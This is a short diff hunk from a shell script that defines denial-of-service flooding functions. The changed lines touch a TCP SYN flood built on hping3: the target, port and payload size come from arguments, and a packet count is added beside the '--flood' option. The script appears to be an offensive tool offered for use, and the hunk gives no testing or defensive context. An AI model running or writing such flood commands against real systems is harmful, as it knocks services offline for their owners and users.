@@ -44,7 +44,7 @@ udp_flood() {
 # Function to perform TCP flood attack
 tcp_flood() {
     echo "Starting TCP flood attack on $1 on port $2 with $3 bytes of data..."
-    sudo hping3 -S $1 -p $2 -d $3 $1 --flood
+    sudo hping3 -S $1 -p $2 -d $3 $1 -c 10000 --flood
 }
 
 # Function to perform ICMP flood attack
